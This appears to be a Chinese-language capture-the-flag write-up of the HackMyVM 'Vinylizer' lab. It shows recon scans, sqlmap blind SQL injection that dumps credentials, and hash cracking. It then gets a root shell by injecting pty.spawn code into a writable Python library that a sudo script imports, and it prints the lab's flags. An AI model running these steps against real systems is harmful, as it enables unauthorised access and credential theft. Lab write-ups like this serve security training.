---
title: Vinylizer
author: hgbe02
date: 2024-03-27
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Vinylizer.html"
---

# Vinylizer

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403271837208.png" alt="image-20240327151300331" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403271837209.png" alt="image-20240327151337903" style="zoom: 50%;" />

开始进行攻击。

## 信息搜集

### 端口扫描

```bash
nmap -sCV -p- 10.0.2.12
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f8:e3:79:35:12:8b:e7:41:d4:27:9d:97:a5:14:b6:16 (ECDSA)
|_  256 e3:8b:15:12:6b:ff:97:57:82:e5:20:58:2d:cb:55:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Vinyl Records Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```
gobuster dir -u http://10.0.2.12/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html.png,jpg,zip
```

```
/.php                 (Status: 403) [Size: 274]
/img                  (Status: 301) [Size: 304] [--> http://10.0.2.12/img/]
/.html.png            (Status: 403) [Size: 274]
/login.php            (Status: 200) [Size: 1408]
/.html.png            (Status: 403) [Size: 274]
/.php                 (Status: 403) [Size: 274]
/server-status        (Status: 403) [Size: 274]
Progress: 1323360 / 1323366 (100.00%)
```

### 漏洞扫描

```bash
sudo nikto -h http://10.0.2.12
```

```bash
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.12
+ Target Hostname:    10.0.2.12
+ Target Port:        80
+ Start Time:         2024-03-27 03:19:57 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 916, size: 60f60f431ef12, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /login.php: Admin login page/section found.
+ 8102 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2024-03-27 03:20:10 (GMT-4) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### Wappalyzer

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403271837211.png" alt="image-20240327152301015" style="zoom:50%;" />

## 漏洞挖掘

### 访问敏感目录

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403271837212.png" alt="image-20240327152337003" style="zoom: 33%;" />

尝试弱密码以及万能密码，虽然没成功，但是它存在报错，提示用户不存在：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403271837213.png" alt="image-20240327152549407" style="zoom: 50%;" />

抓包看一下：

```text
POST /login.php HTTP/1.1
Host: 10.0.2.12
Content-Length: 39
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.0.2.12
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.0.2.12/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=s499nedv7djhha1tnjjs1onjlj
Connection: close

username=admin&password=password&login=
```

`sqlmap`梭一下：

```bash
sqlmap -r sql.txt -p username -dbs
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403271837214.png" alt="image-20240327154619801" style="zoom:50%;" />

是一个基于时间的盲注。。。。

找到三个数据库。

尝试获取表：

```bash
sqlmap -l sql.txt --batch -D vinyl_marketplace --tables
```

```apl
Database: vinyl_marketplace
[1 table]
+-------+
| users |
+-------+
```

查看列值：

```bash
sqlmap -l sql.txt --batch -D vinyl_marketplace -T users --columns
```

```apl
[4 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| id             | int          |
| login_attempts | int          |
| password       | varchar(255) |
| username       | varchar(255) |
+----------------+--------------+
```

```bash
sqlmap -l sql.txt --batch -D vinyl_marketplace -T users --dump
```

```apl
Table: users
[2 entries]
+----+----------------------------------+-----------+----------------+
| id | password                         | username  | login_attempts |
+----+----------------------------------+-----------+----------------+
| 1  | 9432522ed1a8fca612b11c3980a031f6 | shopadmin | 0              |
| 2  | password123                      | lana      | 0              |
+----+----------------------------------+-----------+----------------+
```

解密一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403271837215.png" alt="image-20240327180712065" style="zoom:50%;" />

拿到密码：

```apl
shopadmin 		addicted2vinyl
```

尝试登录，但是显示`Invalid password`。

尝试ssh登录！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403271837216.png" alt="image-20240327181040204" style="zoom: 33%;" />

成功！

## 提权

### 信息搜集

```python
shopadmin@vinylizer:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:6d:ec:17 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.12/24 metric 100 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 305sec preferred_lft 305sec
    inet6 fe80::a00:27ff:fe6d:ec17/64 scope link 
       valid_lft forever preferred_lft forever
shopadmin@vinylizer:~$ sudo -l
Matching Defaults entries for shopadmin on vinylizer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User shopadmin may run the following commands on vinylizer:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/vinylizer.py
shopadmin@vinylizer:~$ cat /opt/vinylizer.py
# @Name: Vinylizer
# @Author: MrMidnight
# @Version: 1.8

import json
import random

def load_albums(filename):
    try:
        with open(filename, 'r') as file:
            content = file.read()
            if not content:
                return []
            albums = json.loads(content)
    except FileNotFoundError:
        albums = []
    except json.JSONDecodeError:
        print(f"Error decoding JSON_Config: {filename}.")
        albums = []
    return albums


def save_albums(filename, albums):
    with open(filename, 'w') as file:
        json.dump(albums, file, indent=None)


def print_albums(albums):
    if not albums:
        print("No albums available.")
    else:
        print("Available Albums:")
        for album in albums:
            print(f"- {album['name']}, Sides: {', '.join(album['sides'])}")


def randomize_sides(album):
    sides = list(album['sides'])
    random.shuffle(sides)
    return {"name": album['name'], "sides": sides}


def randomize_vinyl(albums):
    if not albums:
        print("No albums available. Add one with 'A'.")
        return None, None

    random_album = random.choice(albums)
    random_side = random.choice(random_album['sides'])

    return random_album['name'], random_side


def add_vinyl(albums, filename, name, num_sides):
    # Generate sides from A to the specified number
    sides = [chr(ord('A') + i) for i in range(num_sides)]

    # Add new vinyl
    new_album = {"name": name, "sides": sides}
    albums.append(new_album)
    save_albums(filename, albums)
    print(f"Album '{name}' with {num_sides} sides added successfully.\n")


def delete_vinyl(albums, filename, name):
    for album in albums:
        if album['name'] == name:
            albums.remove(album)
            save_albums(filename, albums)
            print(f"Album '{name}' deleted successfully!\n")
            return
    print(f"Album '{name}' not found.")


def list_all(albums):
    print_albums(albums)


if __name__ == "__main__":

    # Banner. Dont touch!
    print("o      'O                  o\nO       o o               O  o\no       O                 o\no       o                 O\nO      O' O  'OoOo. O   o o  O  ooOO .oOo. `OoOo.\n`o    o   o   o   O o   O O  o    o  OooO'  o\n `o  O    O   O   o O   o o  O   O   O      O\n  `o'     o'  o   O `OoOO Oo o' OooO `OoO'  o\nBy: MrMidnight          o\n                     OoO'                         \n")

    config_file = "config.json"

    albums_config = load_albums(config_file)

    while True:
        choice = input("Do you want to (R)andomly choose a Album, (A)dd a new one, (D)elete an album, (L)ist all albums, or (Q)uit? : ").upper()

        if choice == "R":
            random_album, random_side = randomize_vinyl(albums_config)
            if random_album is not None and random_side is not None:
                print(f"Randomly selected album: {random_album}, Random side: {random_side}\n")

        elif choice == "A":
            name = input("\nEnter the name of the new album: ")

            while True:
                try:
                    num_sides = int(input("Enter the number of sides for the new album: "))
                    break  # Break the loop if the input is a integer
                except ValueError:
                    print("\nInvalid input. Please enter a valid integer for the number of sides.")

            add_vinyl(albums_config, config_file, name, num_sides)

        elif choice == "D":
            name = input("\nEnter the name of the album to delete: ")
            delete_vinyl(albums_config, config_file, name)

        elif choice == "L":
            list_all(albums_config)
            print("")

        elif choice == "Q":
            print("\nQuitting Vinylizer.")
            break

        else:
            print("Invalid Input!")
```

让AI读一下：

> 这个代码是一个简单的 Python 程序，用于管理唱片（或者类似物品）的列表。让我们逐段解释一下它的功能：

1. `load_albums(filename)`: 这个函数负责从文件中加载唱片列表。它尝试打开文件，读取其中的内容，并将其解析为 JSON 格式。如果文件不存在或者解析失败，它会返回一个空列表。
2. `save_albums(filename, albums)`: 这个函数接受一个文件名和一个唱片列表，将唱片列表以 JSON 格式保存到文件中。
3. `print_albums(albums)`: 这个函数用于打印出所有的唱片及其包含的面数。
4. `randomize_sides(album)`: 这个函数用于随机排列一个唱片的面数。
5. `randomize_vinyl(albums)`: 这个函数从给定的唱片列表中随机选择一张唱片，并随机选择其中的一个面数。
6. `add_vinyl(albums, filename, name, num_sides)`: 这个函数用于向唱片列表中添加新的唱片。它接受唱片列表、文件名、唱片名和面数作为参数，并将新唱片添加到列表中，然后保存到文件中。
7. `delete_vinyl(albums, filename, name)`: 这个函数用于从唱片列表中删除指定的唱片。它接受唱片列表、文件名和唱片名作为参数，并在列表中找到并删除对应的唱片，然后保存到文件中。
8. `list_all(albums)`: 这个函数用于列出所有的唱片及其包含的面数。

似乎没有利用点，没有加载什么系统函数，继续搜集信息：

```bash
shopadmin@vinylizer:~$ find / -perm -u=s -type f 2>/dev/null
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/snap/snapd/19457/usr/lib/snapd/snap-confine
/usr/bin/pkexec
/usr/bin/su
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/umount
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1

shopadmin@vinylizer:~$ find / -type f -writable 2>/dev/null
............
/proc/2193/projid_map
/proc/2193/setgroups
/proc/2193/timerslack_ns
/run/user/1001/systemd/generator.late/app-snap\x2duserd\x2dautostart@autostart.service
/run/user/1001/systemd/generator.late/app-polkit\x2dgnome\x2dauthentication\x2dagent\x2d1@autostart.service
/home/shopadmin/.bash_history
/home/shopadmin/.bashrc
/home/shopadmin/.profile
/home/shopadmin/.bash_logout
/home/shopadmin/.viminfo
/home/shopadmin/.cache/motd.legal-displayed
/home/shopadmin/user.txt
/usr/lib/python3.10/random.py
```

作者看来提示我们了，我们可以更改`random.py`，使sudo执行我们想要的函数！

```bash
shopadmin@vinylizer:~$ head /usr/lib/python3.10/random.py
import pty
pty.spawn("/bin/bash")
"""Random variable generators.

    bytes
    -----
           uniform bytes (values between 0 and 255)

    integers
    --------
shopadmin@vinylizer:~$ sudo python3 /opt/vinylizer.py
root@vinylizer:/home/shopadmin# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
root@vinylizer:/home/shopadmin# cd /root;ls
root.txt  snap
root@vinylizer:~# cat root.txt
4UD10PH1L3
root@vinylizer:~# cd /home
root@vinylizer:/home# ls
mrmidnight  shopadmin
root@vinylizer:/home# cd shopadmin/
root@vinylizer:/home/shopadmin# ls
user.txt
root@vinylizer:/home/shopadmin# cat user.txt 
I_L0V3_V1NYL5
```

## 额外收获

观看师傅门wp的时候发现了几个可以学习的地方！

### 使用ghauri进行sql注入

```bash
git clone https://github.com/r0oth3x49/ghauri.git
cd ghauri
pip install -r requirements.txt
sudo python3 setup.py install
```

```bash
ghauri -r sql.txt -p username --dbs
ghauri -r sql.txt -p username - dbms mysql -D vinyl_marketplace --tables
ghauri -r sql.txt -p username - dbms mysql -D vinyl_marketplace -T users - dump
```

实测速度非常快！

### 使用hashcat爆破

```bash
hashcat -a 0 -m 0 "9432522ed1a8fca612b11c3980a031f6" /usr/share/wordlists/rockyou.txt --show
```

- `-a 0` 表示使用字典攻击模式，也就是尝试将哈希值与一个字典中的每个单词进行比对。
- `-m 0` 表示要破解的哈希算法类型。在这里，`0` 代表 MD5 哈希算法。
- `"9432522ed1a8fca612b11c3980a031f6"` 是要破解的哈希值。
- `/usr/share/wordlists/rockyou.txt` 是包含密码列表的路径。在这个命令中，Hashcat 将会尝试使用 RockYou 字典中的密码来与哈希值进行比对。
- `--show` 参数表示如果找到了匹配的密码，将会显示密码本身而不是哈希值。